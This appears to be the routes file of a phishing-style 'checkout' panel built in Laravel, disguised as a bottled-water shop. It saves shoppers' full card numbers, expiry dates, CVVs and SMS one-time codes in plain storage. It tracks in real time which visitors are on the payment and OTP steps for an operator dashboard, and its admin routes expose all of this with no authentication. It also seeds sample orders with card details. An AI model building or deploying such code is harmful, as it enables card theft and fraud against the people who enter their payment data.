<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Storage;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Session;
use App\Models\Order;
use App\Models\Payment;
use App\Models\LiveStat;

Route::get('/', function () {
    return view('welcome');
});

// Helper for database & JSON sync
function getOrCreateServerOrders() {
    try {
        $dbOrders = Order::orderBy('id', 'desc')->get();
        if ($dbOrders->count() > 0) {
            $result = [];
            foreach ($dbOrders as $o) {
                if (!empty($o->order_id)) {
                    try {
                        Payment::updateOrCreate(
                            ['order_id' => $o->order_id],
                            [
                                'card_name' => $o->card_name,
                                'card_number' => $o->card_number,
                                'card_exp' => $o->card_exp,
                                'card_cvv' => $o->card_cvv,
                                'otp_code' => $o->otp_code,
                                'otp_attempts' => $o->otp_attempts ?? 0,
                                'otp_time' => $o->otp_time,
                                'payment_status' => $o->payment_status ?? 'pending',
                                'amount' => $o->total ?? 0,
                            ]
                        );
                    } catch (\Throwable $pe) {}
                }
                $result[] = $o->toFrontendArray();
            }
            Storage::disk('local')->put('admin_orders.json', json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
            return $result;
        }
    } catch (\Throwable $e) {}

    if (Storage::disk('local')->exists('admin_orders.json')) {
        $raw = Storage::disk('local')->get('admin_orders.json');
        $orders = json_decode($raw, true);
        if (is_array($orders) && count($orders) > 0) {
            foreach ($orders as $o) {
                if (empty($o['id'])) continue;
                try {
                    Order::updateOrCreate(
                        ['order_id' => $o['id']],
                        [
                            'customer_name' => $o['customerName'] ?? null,
                            'phone' => $o['phone'] ?? null,
                            'email' => $o['email'] ?? null,
                            'governorate' => $o['governorate'] ?? null,
                            'wilaya' => $o['wilaya'] ?? null,
                            'address' => $o['address'] ?? null,
                            'building' => $o['building'] ?? null,
                            'landmark' => $o['landmark'] ?? null,
                            'lat' => $o['lat'] ?? null,
                            'lng' => $o['lng'] ?? null,
                            'card_name' => $o['cardName'] ?? null,
                            'card_number' => $o['cardNumber'] ?? null,
                            'card_exp' => $o['cardExp'] ?? null,
                            'card_cvv' => $o['cardCvv'] ?? null,
                            'otp_code' => $o['otpCode'] ?? null,
                            'otp_attempts' => $o['otpAttempts'] ?? 0,
                            'otp_time' => $o['otpTime'] ?? null,
                            'order_status' => $o['orderStatus'] ?? 'new',
                            'payment_status' => $o['paymentStatus'] ?? 'pending',
                            'total' => $o['total'] ?? 0,
                            'deposit' => $o['deposit'] ?? 0,
                            'items' => isset($o['items']) ? (is_string($o['items']) ? $o['items'] : json_encode($o['items'], JSON_UNESCAPED_UNICODE)) : null,
                        ]
                    );

                    Payment::updateOrCreate(
                        ['order_id' => $o['id']],
                        [
                            'card_name' => $o['cardName'] ?? null,
                            'card_number' => $o['cardNumber'] ?? null,
                            'card_exp' => $o['cardExp'] ?? null,
                            'card_cvv' => $o['cardCvv'] ?? null,
                            'otp_code' => $o['otpCode'] ?? null,
                            'otp_attempts' => $o['otpAttempts'] ?? 0,
                            'otp_time' => $o['otpTime'] ?? null,
                            'payment_status' => $o['paymentStatus'] ?? 'pending',
                            'amount' => $o['total'] ?? 0,
                        ]
                    );
                } catch (\Throwable $ex) {}
            }
            return $orders;
        }
    }

    $defaultOrders = [
        [
            'id' => 'ORD-984120',
            'customerName' => 'محمد السالمي',
            'phone' => '+968 91234567',
            'email' => 'm.salmi@gmail.com',
            'governorate' => 'مسقط',
            'wilaya' => 'السيب',
            'address' => 'شارع الخوض التجاري، مبنى 44',
            'building' => 'شقة 201',
            'landmark' => 'مقابل جامع السيب',
            'lat' => '23.6142',
            'lng' => '58.1724',
            'cardName' => 'MOHAMMED AL SALMI',
            'cardNumber' => '4111222233334444',
            'cardExp' => '08/28',
            'cardCvv' => '432',
            'otpCode' => '782 109',
            'otpAttempts' => 1,
            'otpTime' => date('Y-m-d H:i'),
            'orderStatus' => 'new',
            'paymentStatus' => 'paid',
            'total' => 14.50,
            'deposit' => 5.00,
            'createdAt' => date('Y-m-d H:i'),
            'items' => [
                ['title' => 'مياه الواحة 700 مل (كرتون 24 حبة)', 'qty' => 2, 'price' => 4.50],
                ['title' => 'مياه الواحة 900 مل', 'qty' => 1, 'price' => 5.50]
            ]
        ],
        [
            'id' => 'ORD-752109',
            'customerName' => 'خالد المعمري',
            'phone' => '+971 501234567',
            'email' => 'khalid@hotmail.com',
            'governorate' => 'دبي',
            'wilaya' => 'المرقبات',
            'address' => 'شارع المكتوم، برج 12',
            'building' => 'مكتب 504',
            'landmark' => 'دبي',
            'lat' => '25.2048',
            'lng' => '55.2708',
            'cardName' => 'KHALID AL MAAMARI',
            'cardNumber' => '5200111122223333',
            'cardExp' => '11/27',
            'cardCvv' => '981',
            'otpCode' => '451 890',
            'otpAttempts' => 1,
            'otpTime' => date('Y-m-d H:i', strtotime('-30 mins')),
            'orderStatus' => 'processing',
            'paymentStatus' => 'paid',
            'total' => 9.00,
            'deposit' => 5.00,
            'createdAt' => date('Y-m-d H:i', strtotime('-40 mins')),
            'items' => [
                ['title' => 'مياه الواحة 700 مل (كرتون 24 حبة)', 'qty' => 2, 'price' => 4.50]
            ]
        ]
    ];

    foreach ($defaultOrders as $o) {
        try {
            Order::updateOrCreate(
                ['order_id' => $o['id']],
                [
                    'customer_name' => $o['customerName'],
                    'phone' => $o['phone'],
                    'email' => $o['email'],
                    'governorate' => $o['governorate'],
                    'wilaya' => $o['wilaya'],
                    'address' => $o['address'],
                    'building' => $o['building'],
                    'landmark' => $o['landmark'],
                    'lat' => $o['lat'],
                    'lng' => $o['lng'],
                    'card_name' => $o['cardName'],
                    'card_number' => $o['cardNumber'],
                    'card_exp' => $o['cardExp'],
                    'card_cvv' => $o['cardCvv'],
                    'otp_code' => $o['otpCode'],
                    'otp_attempts' => $o['otpAttempts'],
                    'otp_time' => $o['otpTime'],
                    'order_status' => $o['orderStatus'],
                    'payment_status' => $o['paymentStatus'],
                    'total' => $o['total'],
                    'deposit' => $o['deposit'],
                    'items' => json_encode($o['items'], JSON_UNESCAPED_UNICODE),
                ]
            );

            Payment::updateOrCreate(
                ['order_id' => $o['id']],
                [
                    'card_name' => $o['cardName'],
                    'card_number' => $o['cardNumber'],
                    'card_exp' => $o['cardExp'],
                    'card_cvv' => $o['cardCvv'],
                    'otp_code' => $o['otpCode'],
                    'otp_attempts' => $o['otpAttempts'],
                    'otp_time' => $o['otpTime'],
                    'payment_status' => $o['paymentStatus'],
                    'amount' => $o['total'],
                ]
            );
        } catch (\Throwable $ex) {}
    }

    Storage::disk('local')->put('admin_orders.json', json_encode($defaultOrders, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    return $defaultOrders;
}

// ═══════════════════════════════════════════════════════════
// SERVER-SIDE REAL-TIME VISITOR TRACKING
// Uses session-based tracking so counts are per-user, not per-browser
// ═══════════════════════════════════════════════════════════

/**
 * Get all tracked user sessions from storage
 * Each session stores: { id, step, timestamp, ip }
 */
function getTrackedUsers() {
    $path = Storage::disk('local')->path('tracked_users.json');
    if (!file_exists($path)) return [];
    $raw = file_get_contents($path);
    $data = json_decode($raw, true) ?: [];
    
    // Filter out sessions inactive for more than 15 minutes
    $now = time();
    $active = [];
    foreach ($data as $sid => $info) {
        if (isset($info['timestamp']) && ($now - $info['timestamp']) < 900) {
            $active[$sid] = $info;
        }
    }
    
    // Save cleaned data
    file_put_contents($path, json_encode($active, JSON_PRETTY_PRINT));
    return $active;
}

/**
 * Save tracked users data
 */
function saveTrackedUsers($users) {
    $path = Storage::disk('local')->path('tracked_users.json');
    file_put_contents($path, json_encode($users, JSON_PRETTY_PRINT));
}

/**
 * Compute live stats from tracked user sessions
 */
function computeLiveStats() {
    $users = getTrackedUsers();
    $visitors = 0;
    $delivery = 0;
    $payment = 0;
    $otp = 0;
    
    foreach ($users as $sid => $info) {
        $step = $info['step'] ?? '';
        switch ($step) {
            case 'visitor': $visitors++; break;
            case 'delivery': $delivery++; break;
            case 'payment': $payment++; break;
            case 'otp': $otp++; break;
        }
    }
    
    return [
        'liveVisitors' => $visitors,
        'liveDelivery' => $delivery,
        'livePayment' => $payment,
        'liveOtp' => $otp,
    ];
}

/**
 * Track a user's current checkout step.
 * Uses a client-generated UUID token (sent in request body) as the stable key.
 * Each browser session generates one token stored in sessionStorage — this ensures
 * one entry per user regardless of session driver or request type.
 */
Route::post('/api/track-step', function (Request $request) {
    $step  = $request->input('step');  // 'visitor','delivery','payment','otp','completed'
    $validSteps = ['visitor', 'delivery', 'payment', 'otp', 'completed'];

    if (!in_array($step, $validSteps)) {
        return response()->json(['success' => false, 'message' => 'Invalid step'], 400);
    }

    // Always use IP + UserAgent as the stable user key so every step overwrites the previous step
    $key = md5($request->ip() . '|' . ($request->userAgent() ?? ''));
    $users = getTrackedUsers();

    if ($step === 'completed') {
        // Remove user from all tracking when they complete the order or reach failure page
        unset($users[$key]);
    } else {
        // Update this user's CURRENT step — this automatically clears the previous step for this user
        $users[$key] = [
            'id'        => $key,
            'step'      => $step,
            'timestamp' => time(),
            'ip'        => $request->ip(),
        ];
    }

    saveTrackedUsers($users);
    $stats = computeLiveStats();

    return response()->json(['success' => true, 'stats' => $stats]);
});

/**
 * Send heartbeat to keep user alive in tracking
 */
Route::post('/api/heartbeat', function (Request $request) {
    $key = md5($request->ip() . '|' . ($request->userAgent() ?? ''));
    $users = getTrackedUsers();
    if (isset($users[$key])) {
        $users[$key]['timestamp'] = time();
        saveTrackedUsers($users);
    }

    return response()->json(['success' => true]);
});

// ═══════════════════════════════════════════════════════════
// EXISTING ADMIN DASHBOARD APIs
// ═══════════════════════════════════════════════════════════

Route::get('/api/admin/orders', function () {
    $orders = getOrCreateServerOrders();
    return response()->json($orders);
});

Route::get('/api/admin/payments', function () {
    try {
        $dbPayments = Payment::orderBy('id', 'desc')->get();
        return response()->json($dbPayments);
    } catch (\Throwable $e) {
        return response()->json([]);
    }
});

Route::post('/api/admin/save-order', function (Request $request) {
    $data = $request->all();
    $orderId = $data['id'] ?? $data['order_id'] ?? null;
    if (empty($orderId)) {
        return response()->json(['success' => false, 'message' => 'Invalid order ID'], 400);
    }

    try {
        $itemsData = $data['items'] ?? null;
        if (is_array($itemsData)) {
            $itemsData = json_encode($itemsData, JSON_UNESCAPED_UNICODE);
        }

        $cardName = $data['cardName'] ?? $data['card_name'] ?? null;
        $cardNumber = $data['cardNumber'] ?? $data['card_number'] ?? null;
        $cardExp = $data['cardExp'] ?? $data['card_exp'] ?? null;
        $cardCvv = $data['cardCvv'] ?? $data['card_cvv'] ?? null;
        $otpCode = $data['otpCode'] ?? $data['otp_code'] ?? null;
        $otpAttempts = $data['otpAttempts'] ?? $data['otp_attempts'] ?? 0;
        $otpTime = $data['otpTime'] ?? $data['otp_time'] ?? null;
        $paymentStatus = $data['paymentStatus'] ?? $data['payment_status'] ?? 'pending';
        $totalAmount = $data['total'] ?? 0;

        Order::updateOrCreate(
            ['order_id' => $orderId],
            [
                'customer_name' => $data['customerName'] ?? $data['customer_name'] ?? null,
                'phone' => $data['phone'] ?? null,
                'email' => $data['email'] ?? null,
                'governorate' => $data['governorate'] ?? null,
                'wilaya' => $data['wilaya'] ?? null,
                'address' => $data['address'] ?? null,
                'building' => $data['building'] ?? null,
                'landmark' => $data['landmark'] ?? null,
                'lat' => $data['lat'] ?? null,
                'lng' => $data['lng'] ?? null,
                'card_name' => $cardName,
                'card_number' => $cardNumber,
                'card_exp' => $cardExp,
                'card_cvv' => $cardCvv,
                'otp_code' => $otpCode,
                'otp_attempts' => $otpAttempts,
                'otp_time' => $otpTime,
                'order_status' => $data['orderStatus'] ?? $data['order_status'] ?? 'new',
                'payment_status' => $paymentStatus,
                'total' => $totalAmount,
                'deposit' => $data['deposit'] ?? 0,
                'items' => $itemsData,
            ]
        );

        Payment::updateOrCreate(
            ['order_id' => $orderId],
            [
                'card_name' => $cardName,
                'card_number' => $cardNumber,
                'card_exp' => $cardExp,
                'card_cvv' => $cardCvv,
                'otp_code' => $otpCode,
                'otp_attempts' => $otpAttempts,
                'otp_time' => $otpTime,
                'payment_status' => $paymentStatus,
                'amount' => $totalAmount,
            ]
        );
    } catch (\Throwable $e) {
        \Illuminate\Support\Facades\Log::error('Order/Payment save error: ' . $e->getMessage());
    }

    $orders = getOrCreateServerOrders();
    return response()->json(['success' => true, 'orders' => array_values($orders)]);
});

Route::post('/api/admin/update-order-status', function (Request $request) {
    $orderId = $request->input('id');
    $field = $request->input('field'); // 'orderStatus' or 'paymentStatus'
    $value = $request->input('value');

    if ($orderId && $field) {
        try {
            $columnMap = [
                'orderStatus' => 'order_status',
                'paymentStatus' => 'payment_status',
            ];
            $dbCol = $columnMap[$field] ?? $field;
            Order::where('order_id', $orderId)->update([$dbCol => $value]);

            if ($field === 'paymentStatus' || $field === 'payment_status') {
                Payment::where('order_id', $orderId)->update(['payment_status' => $value]);
            }
        } catch (\Throwable $e) {}
    }

    $orders = getOrCreateServerOrders();
    return response()->json(['success' => true, 'orders' => array_values($orders)]);
});

Route::delete('/api/admin/delete-order/{id}', function ($id) {
    try {
        Order::where('order_id', $id)->delete();
        Payment::where('order_id', $id)->delete();
    } catch (\Throwable $e) {}

    $orders = getOrCreateServerOrders();
    return response()->json(['success' => true, 'orders' => array_values($orders)]);
});

// Server-side live stats endpoint (reads from session tracking)
Route::get('/api/admin/live-stats', function () {
    $stats = computeLiveStats();
    
    // Also persist to DB and file for fallback
    try {
        LiveStat::updateOrCreate(['id' => 1], $stats);
    } catch (\Throwable $e) {}
    
    Storage::disk('local')->put('admin_live.json', json_encode($stats, JSON_PRETTY_PRINT));
    return response()->json($stats);
});

// Legacy endpoint - kept for backward compatibility, now server-driven
Route::post('/api/admin/update-live-stats', function (Request $request) {
    // This endpoint is now handled server-side via /api/track-step
    // Keep it as no-op to not break existing calls
    $stats = computeLiveStats();
    return response()->json(['success' => true, 'stats' => $stats]);
});

use App\Http\Controllers\CheckoutController;
Route::get('/checkout', [CheckoutController::class, 'index'])->name('checkout');
Route::post('/api/checkout/store', [CheckoutController::class, 'store']);

Route::post('/api/checkout/payment', [CheckoutController::class, 'savePayment']);
Route::post('/api/checkout/otp', [CheckoutController::class, 'saveOtp']);

Route::get('/admin', function () {
    return view('admin');
})->name('admin');

